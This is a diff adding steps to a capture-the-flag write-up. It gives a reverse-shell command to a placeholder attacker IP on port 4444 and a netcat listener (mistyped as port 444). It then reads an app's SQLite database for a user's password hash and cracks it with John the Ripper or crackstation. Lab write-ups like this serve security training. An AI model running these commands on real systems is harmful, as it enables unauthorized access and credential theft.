@@ -86,5 +86,47 @@ if d.__name__ == "BuiltinImporter"]
 _space_group_magn.number_BNS  62.448
 _space_group_magn.name_BNS  "P  n'  m  a'  "
 ```
+Make sure that you are listening on your attacking machine with the port used in the shell commnad, in this case it is 4444.
+You will also need to fill in your attacking machines IP (run ifconfig on your machine to find this).
+```
+SHELL
+("/bin/bash -c \'sh -i >& /dev/tcp/<Attacking Machine IP>/4444 0>&1\'");
 
+LISTENER
+nc -lvnp 444
+```
+From here we can see the user flag on the user Rosa account. Unofrtunately, we do not have access to view/read the file.
+
+![webShell](Images/webShell.png)
+
+
+## User Flag
+
+From here we can look through the machine for more potential information on the user Rosa.
+Reading the app.py file we can see a reference to database.db
+```
+$ cd app
+$ ls
+app.py
+instance
+static
+templates
+uploads
+$ cat app.py
+```
+![appPy](Images/appPy.png)
+
+Reading the database.db file in the instance folder we can see the user Rosa referenced with a string of characters afterward. This appears to be a password hash.
+```
+$ cd instance
+$ ls
+database.db
+$ cat database.db
+```
+![databaseDb](Images/databaseDb.png)
+
+We can either try to crack the password hash locally using a tool such as JohnTheRipper.
+Alternatively, I have used the site crackstation.net, which will check and see if they have the password for the provided password hash.
+
+![crackStation](Images/crackStation.png)
 
